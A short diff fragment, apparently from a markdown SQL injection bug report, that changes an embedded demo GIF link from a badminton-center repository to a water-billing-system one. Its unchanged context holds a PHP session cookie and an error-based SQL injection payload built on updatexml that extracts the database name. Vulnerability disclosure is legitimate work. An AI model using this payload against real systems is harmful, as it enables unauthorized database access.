@@ -30,5 +30,5 @@ Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe
 id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 ```
 
-![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)
+![](https://github.com/mikeccltt/wbms_bug_report/blob/main/water-billing-management-system/sql.gif?raw=true)
 
